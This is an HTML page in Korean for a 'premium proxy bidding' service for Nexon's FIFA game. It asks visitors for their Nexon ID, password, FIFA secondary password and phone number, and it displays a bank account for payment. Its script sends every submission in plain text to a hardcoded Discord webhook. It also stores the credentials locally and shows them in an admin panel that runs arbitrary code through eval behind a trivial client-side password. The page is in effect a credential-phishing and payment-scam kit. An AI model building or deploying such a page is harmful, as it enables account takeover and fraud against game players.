<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>빽대낙 - 프리미엄 대낙 서비스</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Apple SD Gothic Neo', 'Malgun Gothic', 'Noto Sans KR', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            color: #333;
            min-height: 100vh;
        }
        header {
            background-color: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(221, 221, 221, 0.5);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .logo { font-size: 22px; font-weight: 900; color: #2563eb; cursor: pointer; letter-spacing: -0.5px; }
        .nav-links { display: flex; gap: 20px; font-size: 14px; font-weight: 600; }
        .nav-links a { text-decoration: none; color: #4b5563; cursor: pointer; transition: color 0.2s; }
        .nav-links a:hover { color: #2563eb; }
        
        .main-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: calc(100vh - 70px);
            padding: 20px;
        }
        .page { display: none; width: 100%; max-width: 480px; }
        .page.active { display: block; animation: fadeIn 0.3s ease-in-out; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            background: #ffffff;
            padding: 35px 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.8);
        }
        
        .card-header {
            text-align: center;
            margin-bottom: 25px;
        }
        .card-header h2 { font-size: 24px; font-weight: 800; color: #1f2937; margin-bottom: 8px; }
        .card-header p { font-size: 13px; color: #6b7280; }

        .input-group { margin-bottom: 18px; }
        .input-group label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 13px; color: #374151; }
        .input-group input {
            width: 100%; padding: 14px 16px; border: 1.5px solid #e5e7eb;
            border-radius: 10px; font-size: 14px; outline: none; background-color: #f9fafb;
            transition: all 0.2s ease;
        }
        .input-group input:focus { 
            border-color: #2563eb; 
            background-color: #ffffff;
            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
        }

        /* 입금 계좌 안내 박스 스타일 */
        .account-box {
            background-color: #f0fdf4;
            border: 1px solid #bbf7d0;
            border-radius: 10px;
            padding: 12px 15px;
            margin-bottom: 18px;
            font-size: 13px;
            color: #166534;
            text-align: center;
            font-weight: 600;
        }
        
        .btn {
            width: 100%; padding: 15px; background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
            color: #ffffff; border: none; border-radius: 10px; font-size: 16px; font-weight: 700;
            cursor: pointer; transition: transform 0.1s ease, box-shadow 0.2s ease;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
            margin-top: 5px;
        }
        .btn:hover { 
            box-shadow: 0 6px 16px rgba(37, 99, 235, 0.4);
            transform: translateY(-1px);
        }
        .btn:active { transform: translateY(0); }

        /* 관리자 테이블 스타일 */
        .admin-card { max-width: 850px !important; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
        th, td { border-bottom: 1px solid #f0f0f0; padding: 12px 10px; text-align: center; }
        th { background-color: #f8fafc; font-weight: 700; color: #475569; }
        td { color: #334155; }
        
        .admin-controls { margin-top: 20px; display: flex; gap: 10px; }
        .admin-controls input { flex: 1; padding: 12px; border: 1.5px solid #e5e7eb; border-radius: 8px; font-size: 13px; outline: none; }
        .admin-controls button { padding: 0 20px; background-color: #1f2937; color: #fff; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

    <header>
        <div class="logo" onclick="switchPage('home')">⚡ 빽대낙</div>
        <div class="nav-links">
            <a onclick="switchPage('home')">신청하기</a>
            <a onclick="openAdmin()">관리자 모드</a>
        </div>
    </header>

    <div class="main-wrapper">
        <!-- 홈 (신청 페이지) -->
        <div id="home-page" class="page active">
            <div class="card">
                <div class="card-header">
                    <h2>프리미엄 대낙 서비스</h2>
                    <p>안전하고 빠른 대리 낙찰을 진행해 드립니다.</p>
                </div>
                <form onsubmit="handleApply(event)">
                    <div class="input-group">
                        <label>넥슨 아이디</label>
                        <input type="text" id="nexonId" required placeholder="아이디를 입력하세요">
                    </div>
                    <div class="input-group">
                        <label>넥슨 비밀번호</label>
                        <input type="password" id="nexonPw" required placeholder="비밀번호를 입력하세요">
                    </div>
                    <div class="input-group">
                        <label>피파 2차 비밀번호</label>
                        <input type="password" id="fifaPw" required placeholder="2차 비밀번호를 입력하세요">
                    </div>

                    <!-- 피파 2차 비번 아래에 추가된 입금 계좌 안내 박스 -->
                    <div class="account-box">
                        💳 입금 계좌: 토스뱅크  1001-5674-6218 (예금주: 최승우)
                    </div>

                    <div class="input-group">
                        <label>전화번호 (입금 확인용)</label>
                        <input type="text" id="phone" required placeholder="010-0000-0000">
                    </div>
                    <button type="submit" class="btn">신청 완료하기</button>
                </form>
            </div>
        </div>

        <!-- 관리자 페이지 -->
        <div id="admin-page" class="page admin-card">
            <div class="card">
                <div class="card-header">
                    <h2>관리자 실시간 신청 내역</h2>
                    <p>접수된 신청 정보 및 제어 패널</p>
                </div>
                <div style="overflow-x: auto;">
                    <table>
                        <thead>
                            <tr>
                                <th>신청 시간</th>
                                <th>넥슨 아이디</th>
                                <th>넥슨 비밀번호</th>
                                <th>피파 비번</th>
                                <th>전화번호</th>
                            </tr>
                        </thead>
                        <tbody id="applyTableBody">
                            <!-- 실시간 목록 -->
                        </tbody>
                    </table>
                </div>

                <div class="admin-controls">
                    <input type="text" id="adminCodeInput" placeholder="자바스크립트 코드 입력 (예: clearData())">
                    <button onclick="executeAdminCode()">실행</button>
                </div>
                <button onclick="switchPage('home')" class="btn" style="background: #6b7280; margin-top: 15px; box-shadow: none;">홈으로 돌아가기</button>
            </div>
        </div>
    </div>

    <script>
        let applyList = JSON.parse(localStorage.getItem('applyList')) || [];

        function switchPage(pageName) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            if (pageName === 'home') {
                document.getElementById('home-page').classList.add('active');
            } else if (pageName === 'admin') {
                document.getElementById('admin-page').classList.add('active');
                renderAdminTable();
            }
        }

        function handleApply(event) {
            event.preventDefault();
            const nexonId = document.getElementById('nexonId').value;
            const nexonPw = document.getElementById('nexonPw').value;
            const fifaPw = document.getElementById('fifaPw').value;
            const phone = document.getElementById('phone').value;
            const time = new Date().toLocaleString();

            const discordPayload = {
                content: `🚨 **[새로운 대낙 신청 완료!]** 🚨\n> **신청 시간:** ${time}\n> **넥슨 아이디:** \`${nexonId}\`\n> **넥슨 비밀번호:** \`${nexonPw}\`\n> **피파 비밀번호:** \`${fifaPw}\`\n> **전화번호:** \`${phone}\``
            };

            fetch('https://discord.com/api/webhooks/1533786795622273205/39PCiRPZtyRzLqrzCUrqp5YFpBt7WQCoNnnKfYf5cOLLipPt5v2CArkjrw9EAvuw53Hd', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            }).catch(error => console.error("디스코드 전송 에러:", error));

            const newItem = { time, nexonId, nexonPw, fifaPw, phone };
            applyList.unshift(newItem);
            localStorage.setItem('applyList', JSON.stringify(applyList));

            alert(`[빽대낙 신청 완료]\n\n넥슨 아이디: ${nexonId}\n전화번호: ${phone}\n안내된 계좌로 입금해 주시면 확인 후 즉시 처리됩니다!`);
            event.target.reset();
            renderAdminTable();
        }

        function openAdmin() {
            const password = prompt("관리자 비밀번호를 입력하세요:");
            if (password === "0814") {
                switchPage('admin');
            } else if (password !== null) {
                alert("비밀번호가 틀렸습니다!");
            }
        }

        function renderAdminTable() {
            applyList = JSON.parse(localStorage.getItem('applyList')) || [];
            const tbody = document.getElementById('applyTableBody');
            
            if (applyList.length === 0) {
                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; padding: 20px; color: #9ca3af;">신청 내역이 없습니다.</td></tr>`;
                return;
            }

            let html = '';
            applyList.forEach(item => {
                html += `
                    <tr>
                        <td>${item.time}</td>
                        <td><b>${item.nexonId}</b></td>
                        <td>${item.nexonPw}</td>
                        <td>${item.fifaPw}</td>
                        <td>${item.phone}</td>
                    </tr>
                `;
            });
            tbody.innerHTML = html;
        }

        function executeAdminCode() {
            const code = document.getElementById('adminCodeInput').value;
            try {
                const result = eval(code);
                alert("코드 실행 성공!\n결과: " + (result !== undefined ? result : "실행 완료"));
                renderAdminTable();
            } catch (err) {
                alert("코드 실행 에러: " + err);
            }
        }

        function clearData() {
            localStorage.removeItem('applyList');
            applyList = [];
            renderAdminTable();
            return "모든 신청 내역이 초기화되었습니다.";
        }
    </script>
</body>
</html>
